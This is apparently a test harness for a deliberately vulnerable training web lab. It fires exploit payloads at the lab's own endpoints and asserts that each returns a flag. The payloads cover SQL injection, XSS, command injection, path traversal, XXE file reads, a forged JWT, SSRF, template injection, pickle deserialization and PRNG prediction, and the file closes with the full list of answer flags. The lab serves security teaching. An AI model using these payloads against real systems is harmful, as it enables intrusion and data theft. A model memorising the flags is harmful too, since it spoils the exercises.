import asyncio
import base64
import pickle
import time
import random
import jwt
from starlette.testclient import TestClient
from app.main import app
from app.database import init_db, reset_lab_environment

def run_all_tests():
    print("[*] Initializing & Resetting Database...")
    reset_lab_environment()

    client = TestClient(app)

    print("[*] Testing Dashboard (GET /)...")
    res = client.get("/")
    assert res.status_code == 200
    assert "CYBER" in res.text and "Curriculum Progress" in res.text
    print("[+] Dashboard rendered successfully.")

    print("[*] Testing SQLi Auth...")
    res = client.post("/labs/sqli/login", data={"username": "admin' OR '1'='1", "password": "x"})
    assert res.status_code == 200
    assert "FLAG{sqli_auth_bypass_login_pwned_8192}" in res.text
    print("[+] SQLi Auth Bypass: OK")

    print("[*] Testing SQLi UNION...")
    res = client.get("/labs/sqli?q=%27+UNION+SELECT+id%2C+username%2C+role%2C+password%2C+secret_flag+FROM+users--")
    assert res.status_code == 200
    assert "FLAG{sqli_union_db_extraction_7719}" in res.text
    print("[+] SQLi UNION Exfiltration: OK")

    print("[*] Testing SQLi Blind...")
    res = client.get("/labs/sqli/check-user?username=system_flag")
    assert res.status_code == 200
    assert res.json().get("exists") is True
    print("[+] SQLi Blind Inference: OK")

    print("[*] Testing XSS Reflected...")
    res = client.get("/labs/xss?q=<script>alert(1)</script>")
    assert res.status_code == 200
    assert "<script>alert(1)</script>" in res.text
    assert "FLAG{r3fl3ct3d_xss_c00k13_st0l3n_4421}" in res.cookies.get("session_token", "")
    print("[+] XSS Reflected: OK")

    print("[*] Testing XSS Stored & Admin Report...")
    res = client.post("/labs/xss/guestbook", data={"author": "Attacker", "comment": "<script>alert(1)</script>"})
    assert res.status_code == 200
    assert "<script>alert(1)</script>" in res.text
    rep_res = client.post("/labs/xss/report")
    assert rep_res.status_code == 200
    assert "admin_session" in rep_res.text
    print("[+] XSS Stored & Playwright Bot Report: OK")

    print("[*] Testing IDOR...")
    res = client.get("/labs/idor?receipt_id=1337")
    assert res.status_code == 200
    assert "FLAG{1d0r_privilege_escalation_view_secret_3301}" in res.text
    print("[+] IDOR Receipt Enumeration: OK")

    print("[*] Testing CMDi...")
    res = client.post("/labs/cmdi/ping", data={"target": "127.0.0.1 & type flag.txt"})
    assert res.status_code == 200
    assert "FLAG{c0mm4nd_1nj3ct10n_r00t_sh3ll_9824}" in res.text
    print("[+] Command Injection: OK")

    print("[*] Testing LFI...")
    res = client.get("/labs/lfi?file=../../flag.txt")
    assert res.status_code == 200
    assert "FLAG{p4th_tr4v3rs4l_lfi_r34d_syst3m_f1l3s_1048}" in res.text
    print("[+] Local File Inclusion: OK")

    print("[*] Testing JWT Attack (Signature bypass & role elevation)...")
    forged_token = jwt.encode({"sub": "attacker", "role": "admin"}, "wrong_or_none_key", algorithm="HS256")
    res = client.post("/labs/jwt/admin-vault", data={"token": forged_token})
    assert res.status_code == 200
    assert "FLAG{jwt_broken_verification_admin_3389}" in res.text
    print("[+] JWT Signature Bypass & Admin Vault: OK")

    print("[*] Testing SSRF Internal Pivot...")
    res = client.post("/labs/ssrf/check-url", data={"target_url": "http://internal-admin:9000/secret-flag"})
    assert res.status_code == 200
    assert "FLAG{ssrf_internal_pivot_pwned_9941}" in res.text
    print("[+] SSRF Internal Pivot Exfiltration: OK")

    print("[*] Testing SSTI Jinja2...")
    res = client.post("/labs/ssti/render", data={"name": "{{ SYSTEM_FLAG }}", "title": "Hacker"})
    assert res.status_code == 200
    assert "FLAG{ssti_jinja2_template_rce_8812}" in res.text
    res_calc = client.post("/labs/ssti/render", data={"name": "{{ 7 * 7 }}", "title": "Test"})
    assert "49" in res_calc.text
    print("[+] SSTI Jinja2 Expression & Global Extraction: OK")

    print("[*] Testing Race Condition Concurrency...")
    client.post("/labs/race/reset")

    async def race_exploit():
        import httpx
        from httpx import ASGITransport
        transport = ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as ac:
            tasks = [ac.post("/labs/race/redeem", data={"code": "FREE10"}, headers={"accept": "application/json"}) for _ in range(6)]
            responses = await asyncio.gather(*tasks)
            success_count = sum(1 for r in responses if r.status_code == 200 and r.json().get("success"))
            print(f"[+] Concurrent race tasks executed. Successes: {success_count}/6")

    asyncio.run(race_exploit())

    res_buy = client.post("/labs/race/buy-flag")
    assert res_buy.status_code == 200
    assert "FLAG{race_condition_toctou_balance_glitch_4011}" in res_buy.text
    print("[+] Race Condition TOCTOU Balance Glitch & Flag Purchase: OK")

    print("[*] Testing XXE Injection...")
    xxe_payload = """<?xml version="1.0"?>
    <!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///flag.txt">
    ]>
    <order><item>&xxe;</item></order>"""
    res = client.post("/labs/xxe/parse", data={"xml_content": xxe_payload})
    assert res.status_code == 200
    assert "FLAG{xxe_external_entity_disclosure_7261}" in res.text
    print("[+] XXE External Entity Disclosure: OK")

    print("[*] Testing Insecure Deserialization (Pickle)...")
    evil_dict = {"role": "admin", "exploit": True}
    encoded_p = base64.b64encode(pickle.dumps(evil_dict)).decode()
    res = client.post("/labs/deserialization/load", data={"payload": encoded_p})
    assert res.status_code == 200
    assert "FLAG{insecure_pickle_deserialization_rce_5541}" in res.text
    print("[+] Insecure Deserialization: OK")

    print("[*] Testing Mass Assignment...")
    res = client.post("/labs/mass-assignment/profile", data={"username": "student", "role": "admin", "bio": "Exploited"})
    assert res.status_code == 200
    assert "FLAG{mass_assignment_privilege_escalation_1289}" in res.text
    print("[+] Mass Assignment Privilege Escalation: OK")

    print("[*] Testing CSRF State-Changing Operation...")
    res = client.post("/labs/csrf/change-email", data={"email": "attacker@evil.local"})
    assert res.status_code == 200
    assert "FLAG{csrf_state_changing_action_pwned_4431}" in res.text
    print("[+] CSRF Operation: OK")

    print("[*] Testing Open Redirect...")
    res = client.get("/labs/redirect?url=https://attacker.com/login")
    assert res.status_code == 200
    assert "FLAG{open_redirect_phishing_vector_6021}" in res.text
    print("[+] Open Redirect: OK")

    print("[*] Testing CORS Misconfiguration...")
    res = client.get("/labs/cors/api/account-keys", headers={"origin": "https://attacker.com"})
    assert res.status_code == 200
    assert res.headers.get("Access-Control-Allow-Origin") == "https://attacker.com"
    assert "FLAG{cors_arbitrary_origin_credential_leak_3391}" in res.text
    print("[+] CORS Misconfiguration: OK")

    print("[*] Testing File Upload...")
    res = client.post("/labs/upload", files={"file": ("exploit.html", b"<html><script>alert(1)</script></html>", "text/html")})
    assert res.status_code == 200
    assert "FLAG{unrestricted_file_upload_stored_xss_8820}" in res.text
    print("[+] File Upload: OK")

    print("[*] Testing Header Spoofing (X-Forwarded-For)...")
    res = client.get("/labs/headers/admin-panel", headers={"x-forwarded-for": "127.0.0.1"})
    assert res.status_code == 200
    assert "FLAG{header_spoofing_client_ip_bypass_4102}" in res.text
    print("[+] Header Spoofing: OK")

    print("[*] Testing Cryptographic PRNG...")
    client.post("/labs/crypto/request-reset", data={"email": "admin@academy.local"})
    t = int(time.time())
    random.seed(t)
    pred_token = str(random.randint(100000, 999999))
    res = client.post("/labs/crypto/verify-token", data={"email": "admin@academy.local", "token": pred_token})
    assert res.status_code == 200
    assert "FLAG{weak_prng_predictable_token_7734}" in res.text
    print("[+] Weak PRNG Prediction: OK")

    print("[*] Testing API BOLA / Field Exposure...")
    res = client.get("/labs/api-security/api/v1/users/1")
    assert res.status_code == 200
    assert "FLAG{bola_api_sensitive_field_exposure_5519}" in res.text
    print("[+] API Property Exposure: OK")

    print("[*] Testing DOM XSS...")
    res = client.get("/labs/dom-xss?nickname=<img src=x onerror=alert(1)>")
    assert res.status_code == 200
    assert "FLAG{dom_xss_execution_sink_untrusted_source_9918}" in res.text
    print("[+] DOM XSS: OK")

    print("[*] Verifying Flag Submission Engine for all 24 flags...")
    all_flags = [
        "FLAG{sqli_auth_bypass_login_pwned_8192}",
        "FLAG{sqli_union_db_extraction_7719}",
        "FLAG{blind_sqli_boolean_extraction_9102}",
        "FLAG{r3fl3ct3d_xss_c00k13_st0l3n_4421}",
        "FLAG{st0r3d_xss_p3rs1st3nt_p4yl04d_5532}",
        "FLAG{xss_stole_admin_cookie}",
        "FLAG{1d0r_privilege_escalation_view_secret_3301}",
        "FLAG{c0mm4nd_1nj3ct10n_r00t_sh3ll_9824}",
        "FLAG{p4th_tr4v3rs4l_lfi_r34d_syst3m_f1l3s_1048}",
        "FLAG{jwt_broken_verification_admin_3389}",
        "FLAG{ssrf_internal_pivot_pwned_9941}",
        "FLAG{ssti_jinja2_template_rce_8812}",
        "FLAG{race_condition_toctou_balance_glitch_4011}",
        "FLAG{xxe_external_entity_disclosure_7261}",
        "FLAG{insecure_pickle_deserialization_rce_5541}",
        "FLAG{mass_assignment_privilege_escalation_1289}",
        "FLAG{csrf_state_changing_action_pwned_4431}",
        "FLAG{open_redirect_phishing_vector_6021}",
        "FLAG{cors_arbitrary_origin_credential_leak_3391}",
        "FLAG{unrestricted_file_upload_stored_xss_8820}",
        "FLAG{header_spoofing_client_ip_bypass_4102}",
        "FLAG{weak_prng_predictable_token_7734}",
        "FLAG{bola_api_sensitive_field_exposure_5519}",
        "FLAG{dom_xss_execution_sink_untrusted_source_9918}",
    ]

    for f in all_flags:
        sub = client.post("/submit-flag", data={"flag": f}, follow_redirects=False)
        assert sub.status_code in (200, 303)

    print(f"[+] All {len(all_flags)} flags successfully validated!")
    print("\n=======================================================")
    print(">>> [SUCCESS] VULNLAB FULLY VERIFIED AND OPERATIONAL! <<<")
    print("=======================================================")

if __name__ == "__main__":
    run_all_tests()
